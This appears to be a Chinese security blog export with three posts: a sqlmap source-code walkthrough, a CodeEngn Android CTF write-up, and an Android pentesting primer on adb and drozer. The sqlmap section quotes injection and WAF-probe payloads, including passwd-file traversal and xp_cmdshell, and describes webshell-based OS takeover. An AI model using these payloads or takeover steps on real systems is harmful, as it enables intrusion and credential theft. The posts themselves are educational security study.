    <content type="text"><![CDATA[概述不得不承认，Sqlmap是目前使用人数最多，功能最复杂的SQL注入工具。作为一款开源工具，开发者有意的让我们自行去阅读并对其进行扩充，从Github可以看出一直在更新的。对于渗透人员来说，阅读sqlmap源码是很有必要的，我们可以从它的源码之中学习到一些优秀的代码编写思维以及方式，应用到平时的渗透中去。 Sqlmap的结构首先看看Sqlmap的目录结构： 目录说明: 123456789101112131415Doc 帮助文档Extra 拓展程序，包含多种额外功能，例如运行cmd、安全执行、shellcode等Lib 类库程序，包含多种连接库，如5种注入类型、提权操作Plugins 插件程序，包括各种数据库的信息以及数据库的通用事项Procs sql语句，包含oracle，postgresql 等的dns_request程序、Mysql的读写文件、mssql的xp_cmdshell等sql语句Shell shell应用，包含多个语言注入成功的shell脚本Tamper 多个绕过程序Thirdparty 第三方程序，如beautifulsoup、优化，保持连接，颜色等等Txt 爆破字典，如浏览器类型、 表，列字典Udf 用户定义的mysql的攻击载荷Waf waf防火墙特征指纹Xml 多种数据库检测载荷以及指纹定义sqlmap.conf 配置文件sqlmap.py 主程序sqlmap.api 接口程序 Sqlmap的流程图如下所示： 概括起来就是当在命令行输入命令的时候，sqlmap首先会进行初始化的操作（版本检测、模块检测、命令行参数解析、Session读取等），之后便会简单的检测是否存在注入点，如果存在注入点便会进行进一步的注入，最后才是接管（takeover）操作。 Sqlmap初始化大部分工具在进行攻击时都会进行初始化，Sqlmap也不例外。为了保证Sqlmap的正常运行首先需要进行python的版本、功能模块的自检。 1234567891011121314151617181920212223# sqlmap.py 开头，这里利用__import__()抛出的异常来检查必要库的存在。try: __import__("lib.utils.versioncheck") # this has to be the first non-standard importexcept ImportError: exit("[!] wrong installation detected (missing modules). Visit 'https://github.com/sqlmapproject/sqlmap/#installation' for further details")``` 下面是import的模块：``` python# /lib/utils/versioncheck.py if PYVERSION &gt;= "3" or PYVERSION &lt; "2.6": exit("[CRITICAL] incompatible Python version detected ('%s'). For successfully running sqlmap you'll have to use version 2.6.x or 2.7.x (visit 'http://www.python.org/download/')" % PYVERSION)extensions = ("gzip", "ssl", "sqlite3", "zlib")try: for _ in extensions: __import__(_)except ImportError: errMsg = "missing one or more core extensions (%s) " % (", ".join("'%s'" % _ for _ in extensions)) errMsg += "most likely because current version of Python has been " errMsg += "built without appropriate dev packages (e.g. 'libsqlite3-dev')" exit(errMsg) 在这之后才进入main()函数,而main()函数的开头便是检查环境（路径、版本）、输出banner信息、读取命令行参数。这里主要关注的是modulePath()函数，为了方便在Windows以及Linux上运行，这里统一将操作系统的编码转化为Unicode编码后返回： 1234567891011121314# sqlmap.pydef main(): checkEnvironment() setPaths(modulePath()) banner() # Store original command line options for possible later restoration cmdLineOptions.update(cmdLineParser().__dict__) nitOptions(cmdLineOptions) ....def modulePath(): ... return getUnicode(os.path.dirname(os.path.realpath(_)), encoding=sys.getfilesystemencoding() or UNICODE_ENCODING) 之后利用python的optionparser模块来对输入的参数进行分析，在此之前，提取出第一个参数前的内容，例python sqlmap.py作为参数传入OptionParser之后就是对参数进行分析了，首先是帮助、版本、log级有关参数。 123456789# /lib/parse/cmdline def cmdLineParser(argv=None): ... try: parser.add_option("--hh", dest="advancedHelp",action="store_true",help="Show advanced help message and exit") parser.add_option("--version", dest="showVersion",action="store_true",help="Show program's version number and exit") parser.add_option("-v", dest="verbose", type="int",help="Verbosity level: 0-6 (default %d)" % defaults.verbose) .... ... 主要显示如下： 接下来便是一个init()函数，千万不要小看这个init()函数，因为它做了很多很多的工作，当然它大部分与你输入的参数有关： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859# /lib/core/option.pydef init(): _useWizardInterface() # 引导界面、新手教学 setVerbosity() # 设置输出的详细程度 _saveConfig() # 保存参数到配置文件 _setRequestFromFile() # 读取文件中的http请求 _cleanupOptions() # 清除配置选项 _cleanupEnvironment() # 清除环境变量 _dirtyPatches() # 设置http的最大行数 _purgeOutput() # 文件粉碎 _checkDependencies() # 检查第三方库是否存在，比如mysql、mssql等连接库 _createTemporaryDirectory() # 创建临时目录 _basicOptionValidation() # 检查参数是否有效 _setProxyList() # 设置代理 _setTorProxySettings() # 设置tor代理 _setDNSServer() # 设置dns服务器 _adjustLoggingFormatter() # 调整日志格式 _setMultipleTargets() # 检测多个目标 _setTamperingFunctions() # tamper模块 _setWafFunctions() # waf识别模块 _setTrafficOutputFP() _setupHTTPCollector() _resolveCrossReferences() _checkWebSocket() # 检测websocket parseTargetUrl() # 分析目标检查url，并给config赋值 parseTargetDirect() # 分析目标数据库，并给config赋值 if any((conf.url, conf.logFile, conf.bulkFile, conf.sitemapUrl, conf.requestFile, conf.googleDork, conf.liveTest)): _setHTTPTimeout() _setHTTPExtraHeaders() # 设置http头 _setHTTPCookies() _setHTTPReferer() _setHTTPHost() _setHTTPUserAgent() _setHTTPAuthentication() # 设置http验证方式 _setHTTPHandlers() _setDNSCache() _setSocketPreConnect() # 创建一个预连接的socker connect _setSafeVisit() _doSearch() # 搜索url注入 _setBulkMultipleTargets() # 通过bulkfile读取多个url列表 _setSitemapTargets() # 分析sitemap读取url列表 _checkTor() _setCrawler() # 页面爬取深度 _findPageForms() # 从页面中搜索表单 _setDBMS() # 设置数据库类型 _setTechnique() # 设置注入类型 _setThreads() # 设置线程数 _setOS() _setWriteFile() _setMetasploit() # 设置msf接管功能 _setDBMSAuthentication() loadBoundaries() # 加载boundaries.xml文件 loadPayloads() # 加载payload.xml文件 _setPrefixSuffix() update() # sqlmap自动更新 _loadQueries() # 加载queries.xml文件 在初始化之后，便根据不同的需求运行不同的代码，如下所示：123456789101112131415# sqlmap.py#性能的自测功能，输出是图形文件，可以看出整个程序每个步骤的占用时间百分比、函数调用次数，便于能够直观看出程序运行的瓶颈所在。if conf.profile: profile() # 冒烟测试，简单来说就是对一个软件镜像尽可能的功能覆盖测试。 elif conf.smokeTest: smokeTest()# 从livetests.xml里加载用于测试注入功能的网站和配置样例，进行全面的注入测试。elif conf.liveTest: liveTest()else: try: start() # 真正的开始运行 except thread.error as ex: .... 前三个部分主要是软件的测试，和我们平时渗透没有多大关系，这里便不继续深究下去。 Sqlmap核心数据库直连sqlmap可以通过-d参数来直接连接目标数据库，不过一般需要额外安装第三方模块。 123456# /lib/controller/controller.pyif conf.direct: initTargetEnv() setupTargetEnv() action() return True 读取Session对一个网站进行sql注入测试的时候，sqlmap一般会在当前用户的目录下创建一个.sqlmap目录，里面一般会保存目标网站的一些日志、注入点设置、session信息。session信息一般会以sqllite数据库文件的形式存储，里面主要是id、value两个字段，具体图如下： 它的value值一部分是以明文的形式存储，另一部是AttribDict这个对象序列化后的以base64编码后的形式存储的。 注入标记符接下来是检索注入标记符并给出提示询问是否对标记点检测注入，也就是我们常用的*，来指定注入的位置。 123456789101112131415161718192021222324252627282930313233# /lib/core/target.py if conf.data is not None: conf.method = HTTPMETHOD.POST if not conf.method or conf.method == HTTPMETHOD.GET else conf.method hintNames = [] def process(match, repl): retVal = match.group(0) # 先取出整个字符串 if not (conf.testParameter and match.group("name") not in conf.testParameter): # 如果没有指定注入参数 retVal = repl while True: _ = re.search(r"\\g&lt;([^&gt;]+)&gt;", retVal) if _: retVal = retVal.replace(_.group(0), match.group(int(_.group(1)) if _.group(1).isdigit() else _.group(1))) else: break if kb.customInjectionMark in retVal: # 如果有注入标记符 hintNames.append((retVal.split(kb.customInjectionMark)[0], match.group("name"))) return retVal # 如果data中有注入标记符(这里默认的就是*星号，可以用来指定注入位置) if kb.processUserMarks is None and kb.customInjectionMark in conf.data: message = "custom injection marker ('%s') found in option " % kb.customInjectionMark message += "'--data'. Do you want to process it? [Y/n/q] " choice = readInput(message, default='Y').upper() if choice == 'Q': raise SqlmapUserQuitException else: kb.processUserMarks = choice == 'Y' if kb.processUserMarks: kb.testOnlyCustom = True actionsqlmap 的aciton比较简介，功能也比较清楚，主要就是根据我们的参数来dump相应的数据以及接管的操作,我稍微列举了几个有代表性的功能。 123456789101112131415161718192021222324252627# /lib/controller/action.py def action(): ... # dump if conf.getDbs: conf.dumper.dbs(conf.dbmsHandler.getDbs()) if conf.getTables: conf.dumper.dbTables(conf.dbmsHandler.getTables()) if conf.commonTables: conf.dumper.dbTables(tableExists(paths.COMMON_TABLES)) ... # takeover if conf.osCmd: conf.dbmsHandler.osCmd() if conf.osShell: conf.dbmsHandler.osShell() if conf.regRead: conf.dumper.registerValue(conf.dbmsHandler.regRead()) if conf.regAdd: conf.dbmsHandler.regAdd() .... Waf指纹接下来是加载WAF/IDS/IPS测试函数(可选参数)，conf.identifyWaf对应的是--identify-waf参数，sqlmap能够测试的WAF基本上是很齐全了，都在waf目录中。 从上图中的右边代码可以清楚的看出，主要就是发送几个payload来查看服务器做出的回应。然后根据正则等方式进行waf的指纹匹配. 主要发送的payload我也看一下，由以下四部分组成： 12345678910# /lib/core/settings.pyWAF_ATTACK_VECTORS = ( "", # NIL "search=&lt;script&gt;alert(1)&lt;/script&gt;", "file=../../../../etc/passwd", "q=&lt;invalid&gt;foobar", "id=1 %s" % IDS_WAF_CHECK_PAYLOAD)IDS_WAF_CHECK_PAYLOAD = "AND 1=1 UNION ALL SELECT 1,NULL,'&lt;script&gt;alert(\"XSS\")&lt;/script&gt;',table_name FROM information_schema.tables WHERE 2&gt;1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#" crawl爬虫sqlmap的爬虫模块主要--crawl这个参数有关，可以收集潜在的可能存在漏洞的连接，后面跟的参数是爬行的深度。crawl函数在爬虫模块/lib/utils/crawler.py中。代码就不进行列举了，简单的说明下就是Sqlmap会创建一个visited队列和一个value队列，然后进行爬行，先将页面的url通过正则、sitemap之后放入value队列（去重），然后将爬过了url放入visited队列（去重），每次爬行时都会先看看是否已经visited。 接下来是--forms，解析出页面的所有表单的功能实现。调用了/lib/core/common.py中的findPageForms()函数，而对于除了-u方式直接输入目标url的其他输入方式都采用先解析urls，再分别查表的方式 payload(核心)Sqlmap最强大的就是它的注射技术，这也是它最为核心的部分。Sqlmap启动后首先设置测试的level和risk，并识别受测试元素的类型，最终拼凑出相应的漏洞利用方案。这里的payload它主要由boundaries、payloads、queries这几部分组成，且都保存在xml目录下。 boundariesboundaries.xml中保存了注入语句的前缀、后缀，主要就是用来闭合注入点处的前半部分和后半部分。举个例子来说: ?keyword=hello world这里keyword存在注入点，并且是搜索行注入，那么它在服务器端拼接成的语句就是: 1select * from articles where title like '%hello world%'; 所以sqlmap就需要闭合掉前面的引号和后面的引号，就可能会用到boundaries.xml的下列部分： 12345678&lt;boundary&gt; &lt;level&gt;1&lt;/level&gt; &lt;!-- \-\-level 的等级--&gt; &lt;clause&gt;1&lt;/clause&gt; &lt;!-- 从句的类型--&gt; &lt;where&gt;1,2&lt;/where&gt; &lt;!-- 语句注入处, 1 为原始数据后注入，2为随机数后注入--&gt; &lt;ptype&gt;2&lt;/ptype&gt; &lt;prefix&gt;%'&lt;/prefix&gt; &lt;!-- 闭合前半部分--&gt; &lt;suffix&gt; AND '%'='&lt;/suffix&gt; &lt;!-- 闭合后半部分--&gt;&lt;/boundary&gt; 最终会闭合成： 1select * from articles where title like '%hello world%' AND '%'='%'; payloadsxml/payloads 目标下保存着六种注入类型（基于布尔、基于时间、基于错误、union、内联、堆叠）的payload，一般以&lt;test&gt;为结点，&lt;test&gt;具有特定漏洞的全部信息，包括漏洞的level、risk，漏洞类型，利用的方法，检测方法等。主要格式如下： 1（keyword=&apos;%hello world）+prefix（%&apos;）+payloads（AND [RANDNUM]=[RANDNUM]）+comment（#）+suffix（AND (&apos;%&apos;=&apos;） + （ %&apos;） queriesqueries.xml主要就是具体的dump语句了： 12345678910&lt;root&gt; &lt;!-- MySQL --&gt; &lt;dbms value="MySQL"&gt; &lt;!-- .... --&gt; &lt;hostname query="@@HOSTNAME"/&gt; &lt;table_comment query="SELECT table_comment FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='%s' AND table_name='%s'"/&gt; &lt;column_comment query="SELECT column_comment FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='%s' AND table_name='%s' AND column_name='%s'"/&gt; &lt;is_dba query="(SELECT super_priv FROM mysql.user WHERE user='%s' LIMIT 0,1)='Y'"/&gt; &lt;check_udf query="(SELECT name FROM mysql.func WHERE name='%s' LIMIT 0,1)='%s'"/&gt; &lt;!-- .... --&gt; example在测试一个参数的时候sqlmap会遍历所有符合要求的test节点，会分别发送request与response节点下的payload，然后对服务器响应的数据包进行对比，看其是否存在差异，当确认存在注入的时候，就会以vector来加载queries.xml中的查询语句进行注入。 拿个实际注入的例子来说： TamperSqlmap 的Tamper模块主要就是用来绕waf用的，一般都保存在tamper 目录中，可以依据标准格式自定义，比如把payload用like替换等号，base64编码等…..，tamper都是具有一定的格式的，如果在渗透测试中发现sqlmap自带的tamper不符合，便可以依样画葫芦写个tamper出来： 下面是sqlmap自带的tamper，主要将等号替换成like的tamper： 12345678910111213141516171819202122232425262728# quealtolike.py def dependencies(): singleTimeWarnMessage("tamper script '%s' is unlikely to work against %s" % (os.path.basename(__file__).split(".")[0], DBMS.PGSQL))def tamper(payload, **kwargs): """ Replaces all occurances of operator equal ('=') with operator 'LIKE' Tested against: * Microsoft SQL Server 2005 * MySQL 4, 5.0 and 5.5 Notes: * Useful to bypass weak and bespoke web application firewalls that filter the equal character ('=') * The LIKE operator is SQL standard. Hence, this tamper script should work against all (?) databases &gt;&gt;&gt; tamper('SELECT * FROM users WHERE id=1') 'SELECT * FROM users WHERE id LIKE 1' """ retVal = payload if payload: retVal = re.sub(r"\s*=\s*", " LIKE ", retVal) return retVal Sqlmap接管接下来是跟提权/后门/系统有关的模块，主要与takeover.py这类型的脚本有关。 下面是osCmd() 函数： 123456789101112131415161718192021def osCmd(self): if isStackingAvailable() or conf.direct: web = False elif not isStackingAvailable() and Backend.isDbms(DBMS.MYSQL): infoMsg = "going to use a web backdoor for command execution" logger.info(infoMsg) web = True else: errMsg = "unable to execute operating system commands via " errMsg += "the back-end DBMS" raise SqlmapNotVulnerableException(errMsg) self.getRemoteTempPath() # 得到远程临时路径,写入webshell self.initEnv(web=web) if not web or (web and self.webBackdoorUrl is not None): self.runCmd(conf.osCmd) # 执行命令 if not conf.osShell and not conf.osPwn and not conf.cleanup: self.cleanup(web=web) # 清除shell webshellsqlmap自带了一部分的webshell，主要保存在shell目录下，由stager（上传马）、backdoor（执行马），不过这些webshell被压缩过了： php的上传马(stager)： php的执行马(backdoor)： 各位有兴趣的可以改成自己的webshell，压缩的代码如下： 1234567891011data = zlib.decompress(hideAscii(data))def hideAscii(data): retVal = "" for i in xrange(len(data)): if ord(data[i]) &lt; 128: retVal += chr(ord(data[i]) ^ 127) else: retVal += data[i] return retVal Sqlmap其他模块文件粉碎sqlmap自带了文件粉碎功能，可以安全删除文件，且无法恢复。主要由整理硬盘垃圾数据，获取文件句柄，填充垃圾数据，随机命名，最终删除这几个步骤组成。 1234567891011121314151617181920212223242526def purge(directory): ... # 遍历文件 for rootpath, directories, filenames in os.walk(directory): dirpaths.extend([os.path.abspath(os.path.join(rootpath, _)) for _ in directories]) filepaths.extend([os.path.abspath(os.path.join(rootpath, _)) for _ in filenames]) # 修改文件读写属性 for filepath in filepaths: try: os.chmod(filepath, stat.S_IREAD | stat.S_IWRITE) except: pass # 填充垃圾数据 for filepath in filepaths: try: filesize = os.path.getsize(filepath) with open(filepath, "w+b") as f: f.write("".join(chr(random.randint(0, 255)) for _ in xrange(filesize))) except: pass # 截断文件 ... # 重命名文件 ... # 删除文件 ... Sqlmap api如果我们要做二次开发，就可以直接利用这个sqlmap的api，通过进程通信的方式来完成sqlmap的功能,具体请参考这里。 异常汇报在脚本运行中难免会碰到这样那样的错误，sqlmap因此做了很多异常捕获以及处理，如果sqlmap捕获到的异常它无法识别以及处理，便会上传到github上，因此来告知开发者对其进行bug的修复。 1234567891011121314151617181920212223def createGithubIssue(errMsg, excMsg): ...... if choice: ex = None errMsg = errMsg[errMsg.find("\n"):] req = urllib2.Request(url="https://api.github.com/search/issues?q=%s" % urllib.quote("repo:sqlmapproject/sqlmap Unhandled exception (#%s)" % key)) try: content = urllib2.urlopen(req).read() _ = json.loads(content) duplicate = _["total_count"] &gt; 0 closed = duplicate and _["items"][0]["state"] == "closed" if duplicate: warnMsg = "issue seems to be already reported" if closed: warnMsg += " and resolved. Please update to the latest " warnMsg += "development version from official GitHub repository at '%s'" % GIT_PAGE logger.warn(warnMsg) return except: pass 自动更新这部分就不便多展开了，主要就是指sqlmap支持一键升级的功能： 总结这几天大致阅读了Sqlmap的源码，才明白了Sqlmap的强大之处不仅仅在于它的注射功能，更在于它那优秀的代码编码方式、优秀的设计理念、Pythonic 的技巧、各种Python内置模块以及第三方模块的调用等等。也因此学习到了很多新的知识，比如临时文件的粉碎级别删除等等，看了它那优秀的编码后才明白自己平时渗透测试时写的脚本看上去狗爬一般。看来平时还得多抽空看看那些有些的渗透框架、工具，这样才可以尽量避免闭门造车，省去很多很多精力。]]></content>
      <categories>
        <category>tool</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>sqlmap</tag>
        <tag>code</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android CodeEngn 练习]]></title>
    <url>%2F2017%2F06%2F25%2Fandroid-codeengn%2F</url>
    <content type="text"><![CDATA[概述为了让初学者能够更好的学习基于android的渗透测试，CodeEngn开发了很多的android app供大伙学习。 SmartApp AnalysisSmartApp 01题目地址SmartApp 01 解题步骤发现程序不能直接安装到手机上。 解压APK文件后发现有三个文件的文件名是错误的且缺少META-INF文件，所以不能正常安装到手机，如下图所示： 修改错误的文件名后，进行zip压缩，并修改后缀为apk，然后进行签名： 12$ jarsigner -verbose -sigalg MD5withRSA -digestalg SHA1 -keystore 【keystore名称】 【apk文件】 【密钥别名】$ jarsigner -verbose -sigalg MD5withRSA -digestalg SHA1 -keystore releasekey.keystore C:\Users\dell\Desktop\app-test\SmartApp-L01.apk keyalias 签名成功后安装到移动设备上，打开启动app就可以看到Key：H3ll0 C0de3ngn。 SmartApp 02题目地址SmartApp 02 解题步骤发现程序不能直接安装到手机上。 解压apk文件后发现缺少META-INF文件，签名成功后安装到移动设备上，打开启动app就可以看到如下界面： 于是反编译了下源代码，发现key的值被加密了，而且作了限制，只有条件成立，才能解密： 于是修改smali代码： 重新编译下程序，然后再进行一次签名，然后安装到手机上，key就出来了： The Key is November Rain。 SmartApp 03题目地址SmartApp 03 解题步骤发现程序不能直接安装到手机上。 解压apk文件后发现缺少META-INF文件，签名成功后安装到移动设备上，打开启动app就可以看到如下界面： 用androidlyze.py分析了下代码： 123$ a, d, dx=AnalyzeAPK('Desktop/SmartAppL03.apk', decompiler="dad")$ d.CLASS_Lcom_Namdaehyeon_findekey3_MainActivity.source()$ d.CLASS_Lcom_Namdaehyeon_findekey3_MainActivity_1.source() 看了代码之后，发现模拟器界面没有显示全，少了几个按钮，而且看到了判断的条件： 首先修改判定条件，如下图： 然后进行签名。既然模拟器运行不全，应该是android的版本有问题，换到手机试下： SmartApp 04题目地址SmartApp 04 解题步骤直接反编译一下，发现这里有个条件判断，输入key后才能显示答案正确： 先看下dex的字符串： 找到了一个比较可疑的地方，这里有一个helloWorldD函数，而直接还原成java代码，并不能找到： 通过010编辑器查看确实有一个helloWorldD函数，应该是被隐藏掉了： 找到原先的helloWorldC函数，它后面应该是helloWorldD函数，记下地址：0x0cd0 找到如下图所示的地方，根据前几个函数相应的规则，修改： 用androidlyze.py分析了下代码： 12$ d,dx = AnalyzeDex("Desktop/classes.dex",decompiler="dad")$ d.CLASS_Lcom_namdaehyeon_zfinekey4_zFindKey.source() 可以看到就是每个位置和 240(0xf0) 异或了下： 解出来就是： The Key is BoanprojectZZang #总结]]></content>
      <categories>
        <category>android</category>
      </categories>
      <tags>
        <tag>android</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android 渗透测试基础入门]]></title>
    <url>%2F2017%2F06%2F22%2Fandroid-base%2F</url>
    <content type="text"><![CDATA[概述自从毕业了之后就少了很多杂七杂八的事，可以好好的学习下Android以及Android渗透测试。 基本结构AndroidAndroid 架构Android 是基于 Linux 平台的操作系统。Android的系统架构和其操作系统一样，采用了分层的架构。从架构图看，Android分为四个层，从高层到低层分别是应用程序层、应用程序框架层、系统运行库层和Linux内核层。 Android使用Dalvik虚拟机的概念，可以高效的运行多个虚拟机。Android操作系统使用这些虚拟机将各个应用程序运行为自己的进程。 安装的应用程序会因各种目的保存到如下目录： 123456/system/app/应用名.apk // 保存系统应用程序/data/app/应用名.apk // 保存已注册的用户应用程序/data/app/应用名-1.apk // 保存用户下载的应用程序/mnt/secure/asec/应用名-1.asec // 保存移动到SD卡的应用程序/data/data/应用名 // 保存应用程序的重要信息/mnt/sdcard // 保存应用程序的一般信息 其中/data/data/应用名保存的信息最为重要： 123456/data/data/应用名├─files // 保存内部使用的文件（so、data、ini文件等）├─lib // 保存应用程序请求的库文件（存在so文件）├─databases // 保存设置文件、内容文件等的查询信息的SQLite数据库文件（存在db文件）├─cache // 有读写权限，包括浏览器缓存和用户临时状态信息└─shared_prefs // 保存为XML文件，是应用程序共享的设置文件 其中 shared_prefs 目录内的preferences.xml文件包含应用程序的设置文件。因为包括升级、版本信息等内容，所以恶意访问时，此处会包含API密钥的盗用、认证密钥值等信息。 Android 重要组件以及生命周期Android 由Activity，Service（服务）,Content Provider（内容提供者），BroadCastReceiver（广播接收器）四大基本组件组成。 ActivityAndroid 应用程序中，一个Activity通常就是一个单独的屏幕，它上面可以显示一些控件也可以监听并处理用户的事件做出响应。 Activity的生命周期如下图所示： 途中涉及到的各类方法： ServiceService 不会显示给用户，其运行过程与Activity相似。听音乐或者录音都在后台运行，与其他软件的运行是同时的，这些都属于Service的功能。 Activity与Service都以名为UI线程的相同应用线程执行。 Content ProviderContent Provider 是应用程序之间共享数据的界面。Android的每个应用程序都默认在Sandbox中运行，所以与系统中的其他应用程序相互分隔，不能直接访问数据。Content Provider遵守CURD（Create、Update、Read、Delete）原则。应用程序通过Inter共享小数据。Content Provider 适合共享音乐文件、图片文件等大容量文件。 BroadCastReceiver你的应用可以使用它对外部事件进行过滤只对感兴趣的外部事件(如当电话呼入时，或者数据网络可用时)进行接收并做出响应。广播接收器没有用户界面。然而，它们可以启动一个activity或serice 来响应它们收到的信息，或者用NotificationManager 来通知用户。通知可以用很多种方式来吸引用户的注意力──闪动背灯、震动、播放声音等。一般来说是在状态栏上放一个持久的图标，用户可以打开它并获取消息。 四大组件的注册四大基本组件都需要注册才能使用，每个Activity、service、Content Provider内容提供者都需要在AndroidManifest文件中进行配置，AndroidManifest文件中未进行声明的activity、服务以及内容提供者将不为系统所见，从而也就不可用，而BroadcastReceive广播接收者的注册分静态注册（在AndroidManifest文件中进行配置）和通过代码动态创建并以调用Context.registerReceiver()的方式注册至系统。需要注意的是在AndroidManifest文件中进行配置的广播接收者会随系统的启动而一直处于活跃状态,只要接收到感兴趣的广播就会触发（即使程序未运行）。 AndroidManifest文件中进行注册格式如下：1234&lt;activity&gt; 元素的name 属性指定了实现了这个activity 的Activity 的子类。icon 和label 属性指向了包含展示给用户的此activity 的图标和标签的资源文件。&lt;service&gt; 元素用于声明服务&lt;receiver&gt; 元素用于声明广播接收器&lt;provider&gt; 元素用于声明内容提供者 APKAPK 文件其实是一个 Zip 的压缩包，解压了此文件可以看到如下目录： 12345678910APK├─META-INF // 主要存放证书，没有证书无法安装程序 │ ├─CERT.RSA // 公钥证书│ ├─CERT.SF // 包含APP的所用资源，负责对APP进行签名│ └─MANIFEST.MF // 声明了资源，与CERT.SF相似├─res // 存放资源文件的目录├─lib // 如果存在的话，存放的是 ndk 编出来的 so 库├─resources.arsc // 编译后的二进制资源文件├─classes.dex // 最终生成的 dalvik 字节码└─AndroidManifest.xml // 程序全局配置文件 classes.dexDex是Android系统中可以在Dalvik虚拟机上直接运行的文件格式。java源代码经过ADT的复杂编译后转换成Dex文件，这是一个逐步优化的过程。Dex文件的指令码就是Dalvik虚拟机专有的一套指令集，专门为嵌入式系统优化过，相比标准java的.class文件，它体积小，运行效率高。 classes.dex 文件头的格式如下： androidManifest.xmlandroidManifest.xml 是每个Android程序中必须的文件，它位于整个项目的根目录。我们每天都在使用这个文件，往里面配置程序运行所必要的组件，权限，以及一些相关信息。 AndroidManifest.xml是Android应用的入口文件，它描述了package中暴露的组件（activities, services, 等等），他们各自的实现类，各种能被处理的数据和启动位置。 除了能声明程序中的Activities, ContentProviders, Services, 和Intent Receivers,还能指定permissions和instrumentation（安全控制和测试）。 常用工具ADBadb的全称为Android Debug Bridge，就是起到调试桥的作用。通过adb我们可以在Eclipse中方面通过DDMS来调试Android程序，说白了就是debug工具。adb的工作方式比较特殊，采用监听Socket TCP 5554等端口的方式让IDE和Qemu通讯，默认情况下adb会daemon相关的网络端口，所以当我们运行Eclipse时adb进程就会自动运行。 借助adb工具，可以管理设备或手机模拟器的状态。还可以进行很多手机操作，如安装软件、系统升级、运行shell命令等等。其实简而言说，adb就是连接Android手机与PC端的桥梁，可以让用户在电脑上对手机进行全面的操作 命令介绍123456789101112131415161718192021222324252627282930313233343536# 查看设备$ adb devices# 连接设备（夜神模拟器端口 62001）$ adb connect ip:port # 安装软件$ adb install [apk文件路径]# 卸载软件$ adb uninstall [软件名]$ adb uninstall -k [软件名] // 如果加 -k 参数,为卸载软件但是保留配置和缓存文件.# 进入设备或模拟器的shell$ adb shell# 运行单条命令$ adb shell [command]# 端口转发$ adb forward [PC] [设备]$ adb forward tcp:6100 tcp:7100 // PC上所有6100端口通信数据将被重定向到手机端7100端口server上$ adb forward tcp:6100 local:logd // PC上所有6100端口通信数据将被重定向到手机端UNIX类型socket上$ adb forward tcp:62002 jdwp:17304 //在本地62002端口被重定向到手机17304进程上# 从电脑上发送文件到设备$ adb push [本地路径] [远程路径]# 从设备上下载文件到电脑$ adb pull [远程路径] [本地路径]# 查看bug报告$ adb bugreport# 查看log$ adb logcat drozerDrozer原名mercury,是一款不错的Android APP安全评估工具。现在有社区版/专业版两个版本。 安装安装其实比较简单，这里不进行描述，只是记录下安装过程中遇到的问题以及解决方案。 一、修复连接时java路径找不到问题 解决方案： 1、创建如下文件并命名为：1.txt （如果为winXP，则可以直接命名为.drozer_config）2、写入内容如下几行内容：此处为java.exe文件的安装位置，具体情况具体处理。 123[executables]java =C:\rogram Files\Java\jdk1.7.0_40\bin\java.exejavac =C:\Program Files\Java\jdk1.7.0_04\bin\javac.exe 3、把此文件放入个人目录下文件夹： 12英文：C:\Users\&lt;youruser name&gt;\中文：C:\用户\&lt;你的用户名名称&gt;\ 4、通过cmd命令重命名此文件为：.drozer_config 1rename C:\Users\d00218136\1.txt .drozer_config 运行12$ adb connect 127.0.0.1:62001 // 连接设备$ adb forward tcp:31415 tcp:31415 // 开启端口转发 开启移动设备中的agent.apk 1$ drozer console connect 用法123# 列出设备中安装的包$ run app.package.list$ run app.package.list -f 【app名称】 // 搜索包 1234# 获取安装的包的信息$ run app.package.info$ run app.package.info -a com.zjhcsoft.android.eip // 列举指定包的信息$ run app.package.info -p android.permission.INTERNET // 根据权限来列举包 123# 列举设备上所有的activity$ run app.activity.info$ run app.activity.info -f 【包名】 搜索包的activity 1234567891011121314151617181920# 列举设备上所有的provider$ run app.provider.info# 列举设备上所有的service$ run app.service.info# 列举设备上所有的broadcast$ run app.broadcast.info# 查看某包的受攻击面$ run app.package.attacksurface com.zjhcsoft.android.eip# 运行activity$ run app.activity.info -a 【包】 $ run app.activity.start --action 【activity 设置的intent filter的action属性】 --category 【activity 设置的intent filter的category 属性】--component 【package 名字】 【component 属性】$ run app.activity.start --action android.intent.action.MAIN --category android.intent.category.LAUNCHER --component com.android.browser com.android.browser.BrowserActivity# 根据指定的intent action和intent category来查看activity$ run app.activity.forintent --action 【intent action】 --category 【intent category】$ run app.activity.forintent --action android.intent.action.VIEW --category android.intent.category.DEFAULT 其他用法： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455Dex是Android系统中可以在Dalvik虚拟机上直接运行的文件格式。java源代码经过ADT的复杂编译后转换成Dex文件，这是一个逐步优化的过程。Dex文件的指$ run 令码就是Dalvik虚拟机专有的一套指令集，专门为嵌入式系统优化过，相比标准jav// a的.class文件，它体积小，运行效率高。$ run app.activity.forintent // Find activities that can handle the given intent $ run app.activity.info // Gets information about exported activities. $ run app.activity.start // Start an Activity $ run app.broadcast.info // Get information about broadcast receivers $ run app.broadcast.send // Send broadcast using an intent $ run app.broadcast.sniff // Register a broadcast receiver that can sniff particular intents $ run app.package.attacksurface // Get attack surface of package $ run app.package.backup // Lists packages that use the backup API (returns true on FLAG_ALLOW_BACKUP) $ run app.package.debuggable // Find debuggable packages $ run app.package.info // Get information about installed packages $ run app.package.launchintent // Get launch intent of package $ run app.package.list // List Packages $ run app.package.manifest // Get AndroidManifest.xml of package $ run app.package.native // Find Native libraries embedded in the application. $ run app.package.shareduid // Look for packages with shared UIDs $ run app.provider.columns // List columns in content provider $ run app.provider.delete // Delete from a content provider $ run app.provider.download // Download a file from a content provider that supports files $ run app.provider.finduri // Find referenced content URIs in a package $ run app.provider.info // Get information about exported content providers $ run app.provider.insert // Insert into a Content Provider $ run app.provider.query // Query a content provider $ run app.provider.read // Read from a content provider that supports files $ run app.provider.update // Update a record in a content provider $ run app.service.info // Get information about exported services $ run app.service.send // Send a Message to a service, and display the reply $ run app.service.start // Start Service $ run app.service.stop // Stop Service $ run auxiliary.webcontentresolver // Start a web service interface to content providers. $ run exploit.jdwp.check // Open @jdwp-control and see which apps connect $ run exploit.pilfer.general.apnprovider // Reads APN content provider $ run exploit.pilfer.general.settingsprovider // Reads Settings content provider $ run information.datetime // Print Date/Time $ run information.deviceinfo 